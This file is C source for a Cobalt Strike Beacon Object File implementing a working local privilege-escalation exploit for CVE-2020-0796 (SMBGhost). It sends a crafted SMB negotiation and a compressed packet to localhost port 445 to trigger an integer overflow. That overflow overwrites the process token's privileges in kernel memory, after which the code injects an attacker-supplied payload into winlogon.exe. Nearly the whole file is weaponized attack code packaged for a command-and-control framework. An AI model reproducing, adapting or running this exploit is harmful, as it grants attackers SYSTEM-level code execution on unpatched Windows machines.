/*
 * CVE-2020-0796 LPE
 *
 * Daniel Garcia Gutierrez (@danigargu) - danigargu[at]gmail.com
 * Manuel Blanco Parajon (@dialluvioso) - dialluvioso[at]protonmail.com
 * https://github.com/danigargu/CVE-2020-0796
 * Date: 03/29/2020
 *
 * Metasploit version (this is based on the MSF version):
 * https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/CVE-2020-0796
 *
 **/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include "exploit.h"
#include "beacon.h"

#include "libc.c"

DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);

DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetCurrentProcessId();
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetProcessId(HANDLE);
DECLSPEC_IMPORT HGLOBAL  WINAPI KERNEL32$GlobalAlloc(UINT uFlags,SIZE_T dwBytes);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$Process32First(HANDLE, void *);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$Process32Next(HANDLE, void *);
DECLSPEC_IMPORT VOID     WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);

DECLSPEC_IMPORT HLOCAL   WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL   WINAPI KERNEL32$LocalFree(HLOCAL);

DECLSPEC_IMPORT u_short  WSAAPI WS2_32$htons(u_short hostshort);
DECLSPEC_IMPORT INT      WSAAPI WS2_32$InetPtonW(INT    Family, PCWSTR pszAddrString, PVOID  pAddrBuf);
DECLSPEC_IMPORT int      WSAAPI WS2_32$connect(SOCKET s,const struct sockaddr *name,int namelen);
DECLSPEC_IMPORT int      WSAAPI WS2_32$recv(SOCKET s, char *buf, int len, int flags);
DECLSPEC_IMPORT int      WSAAPI WS2_32$send(SOCKET s, const char *buf, int len, int flags);
DECLSPEC_IMPORT SOCKET   WSAAPI WS2_32$socket(int af,int type,int protocol);
DECLSPEC_IMPORT int      WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT int      WSAAPI WS2_32$WSAStartup(WORD wVersionRequested,LPWSADATA lpWSAData);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$RtlCompressBuffer(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$RtlGetCompressionWorkSpaceSize(IN USHORT CompressionFormatAndEngine, OUT PULONG CompressBufferWorkSpaceSize, OUT PULONG CompressFragmentWorkSpaceSize);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);

ULONG64 get_handle_addr(HANDLE h) {
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;

	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)KERNEL32$GlobalAlloc(GMEM_ZEROINIT, len);
		status = NTDLL$NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		return 0;
	}

	DWORD mypid    = KERNEL32$GetProcessId(KERNEL32$GetCurrentProcess());
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		if (pid != mypid)
			continue;
		if (handle == (ULONG_PTR)h)
			return (ULONG64)object;
	}
	return 0;
}

ULONG64 get_process_token() {
	HANDLE token;
	HANDLE proc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, KERNEL32$GetCurrentProcessId());
	if (proc == INVALID_HANDLE_VALUE)
		return 0;

	ADVAPI32$OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);
	return get_handle_addr(token);
}

int error_exit(SOCKET sock) {
	WS2_32$WSACleanup();
	return EXIT_FAILURE;
}

int send_negotiation(SOCKET sock) {
	int err = 0;
	char response[8] = { 0 };
	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,                   /* session */
		0x00, 0x00, 0xC4,       /* length */

		/* SMB Header */
		0xFE, 0x53, 0x4D, 0x42, /* protocol id */
		0x40, 0x00,             /* structure size, must be 0x40 */
		0x00, 0x00,             /* credit charge */
		0x00, 0x00,             /* channel sequence */
		0x00, 0x00,             /* channel reserved */
		0x00, 0x00,             /* command */
		0x00, 0x00,             /* credits requested */
		0x00, 0x00, 0x00, 0x00, /* flags */
		0x00, 0x00, 0x00, 0x00, /* chain offset */
		0x00, 0x00, 0x00, 0x00, /* message id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x00, 0x00, 0x00, 0x00, /* tree id */
		0x00, 0x00, 0x00, 0x00, /* session id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* signature */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,

		/* SMB Negotiation Request */
		0x24, 0x00,             /* structure size */
		0x08, 0x00,             /* dialect count, 8 */
		0x00, 0x00,             /* security mode */
		0x00, 0x00,             /* reserved */
		0x7F, 0x00, 0x00, 0x00, /* capabilities */
		0x01, 0x02, 0xAB, 0xCD, /* guid */
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x78, 0x00,             /* negotiate context */
		0x00, 0x00,             /* additional padding */
		0x02, 0x00,             /* negotiate context count */
		0x00, 0x00,             /* reserved 2 */
		0x02, 0x02,             /* dialects, SMB 2.0.2 */
		0x10, 0x02,             /* SMB 2.1 */
		0x22, 0x02,             /* SMB 2.2.2 */
		0x24, 0x02,             /* SMB 2.2.3 */
		0x00, 0x03,             /* SMB 3.0 */
		0x02, 0x03,             /* SMB 3.0.2 */
		0x10, 0x03,             /* SMB 3.0.1 */
		0x11, 0x03,             /* SMB 3.1.1 */
		0x00, 0x00, 0x00, 0x00, /* padding */

		/* Preauth context */
		0x01, 0x00,             /* type */
		0x26, 0x00,             /* length */
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x01, 0x00,             /* hash algorithm count */
		0x20, 0x00,             /* salt length */
		0x01, 0x00,             /* hash algorith, SHA512 */
		0x00, 0x00, 0x00, 0x00, /* salt */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00,             /* pad */

		/* Compression context */
		0x03, 0x00,             /* type */
		0x0E, 0x00,             /* length */
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x02, 0x00,             /* compression algorithm count */
		0x00, 0x00,             /* padding */
		0x01, 0x00, 0x00, 0x00, /* flags */
		0x02, 0x00,             /* LZ77 */
		0x03, 0x00,             /* LZ77+Huffman */
		0x00, 0x00, 0x00, 0x00, /* padding */
		0x00, 0x00, 0x00, 0x00
	};

	if ((err = WS2_32$send(sock, (const char*)buf, sizeof(buf), 0)) != SOCKET_ERROR) {
		WS2_32$recv(sock, response, sizeof(response), 0);
	}

	return err;
}

int send_compressed(SOCKET sock, unsigned char* buffer, ULONG len) {
	int err = 0;
	char response[8] = { 0 };

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x00, 0x33,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x10, 0x00, 0x00, 0x00, /* offset */
	};

	uint8_t* packet = (uint8_t*)KERNEL32$LocalAlloc(0, sizeof(buf) + 0x10 + len);
	if (packet == NULL) {
		return error_exit(sock);
	}

	mycopy(packet, buf, sizeof(buf));
	*(uint64_t*)(packet + sizeof(buf)) = 0x1FF2FFFFBC;
	*(uint64_t*)(packet + sizeof(buf) + 0x8) = 0x1FF2FFFFBC;
	mycopy(packet + sizeof(buf) + 0x10, buffer, len);

	if ((err = WS2_32$send(sock, (const char*)packet, sizeof(buf) + 0x10 + len, 0)) != SOCKET_ERROR) {
		WS2_32$recv(sock, response, sizeof(response), 0);
	}

	KERNEL32$LocalFree(packet);
	return err;
}

/*
 * The BOOL is not success or failure. TRUE means: stop trying. FALSE means: try again, if failed.
 */
BOOL inject(char * payload, int plen) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	int pid = -1;
	if (KERNEL32$Process32First(snapshot, &entry) == TRUE) {
		while (KERNEL32$Process32Next(snapshot, &entry) == TRUE) {
			if (mycmpi(entry.szExeFile, "winLOgoN.eXe")) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	KERNEL32$CloseHandle(snapshot);

	if (pid < 0) {
		BeaconPrintf(CALLBACK_ERROR, "Could not find winlogon.exe pid!");
		return TRUE;
	}

	HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL) {
		/* exploit failed, return FALSE to signal we should try again */
		return FALSE;
	}

	/* follow Malleable C2's logic to inject into winlogon.exe */
	BeaconInjectProcess(hProc, pid, payload, plen, 0, NULL, 0);

	/* we were successful... probably... BeaconInjectProcess reports its own errors */
	return TRUE;
}

DWORD exploit() {
	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = { 0 };
	SOCKET sock = INVALID_SOCKET;
	uint64_t ktoken = 0;

	int err = 0;

	if ((err = WS2_32$WSAStartup(wVersionRequested, &wsaData)) != 0) {
		return EXIT_FAILURE;
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		WS2_32$WSACleanup();
		return EXIT_FAILURE;
	}

	sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		WS2_32$WSACleanup();
		return EXIT_FAILURE;
	}

	SOCKADDR_IN client;
	client.sin_family = AF_INET;
	client.sin_port = WS2_32$htons(445);
	WS2_32$InetPtonW(AF_INET, L"127.0.0.1", &client.sin_addr);

	if (WS2_32$connect(sock, (SOCKADDR*)&client, sizeof(client)) == SOCKET_ERROR) {
		return error_exit(sock);
	}

	if (send_negotiation(sock) == SOCKET_ERROR) {
		return error_exit(sock);
	}

	ULONG buffer_size = 0x1110;
	UCHAR* buffer = (UCHAR*)KERNEL32$LocalAlloc(0, buffer_size);
	if (buffer == NULL) {
		return error_exit(sock);
	}

	ktoken = get_process_token();
	if (ktoken == 0) {
		return EXIT_FAILURE;
	}

	__stosb(buffer, 'A', 0x1108);
	*(uint64_t*)(buffer + 0x1108) = ktoken + 0x40; /* where we want to write */

	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = NTDLL$RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		return error_exit(sock);
	}

	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = KERNEL32$LocalAlloc(0, CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		return error_exit(sock);
	}

	err = NTDLL$RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		KERNEL32$LocalFree(lpWorkSpace);
		return error_exit(sock);
	}

	if (send_compressed(sock, compressed_buffer, FinalCompressedSize) == SOCKET_ERROR) {
		return error_exit(sock);
	}

	WS2_32$WSACleanup();
	return EXIT_SUCCESS;
}

/*
 * simply try the exploit and tell the user what they can do next.
 *
 * I'm exposing this option as elevate is weaponization window dressing. The injection into winlogon.exe
 * is not necessary. We can inject or spawnu (safer) if the exploit was successful.
 */
void exploit_only() {
	BeaconRevertToken(); /* if the user did make_token or something, we want to clear that */

	if (exploit() != EXIT_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR, "Could not carry out exploit steps.");
		return;
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "Exploit executed. Your process token may have superpowers. Try to inject or spawnu into something elevated.");
	}
}

/*
 * elevate and spawn a session.
 */
void elevate(char * buff, int len) {
	int x;

	BeaconRevertToken(); /* if the user did make_token or something, we want to clear that */

	for (x = 0;x < 5; x++) {
		/* try the actual exploit... */
		if (exploit() != EXIT_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "Could not carry out exploit steps.");
			return;
		}

		/* try our inject... if we can find winlogon.exe and open it, the exploit succeeded
		   but the injection failed. */
		if (inject(buff, len))
			return;

		KERNEL32$Sleep(1000);
	}

	/* if we're here... the exploit failed. */
	BeaconPrintf(CALLBACK_ERROR, "Exploit failed (could not open winlogon.exe process): %d", KERNEL32$GetLastError());
}
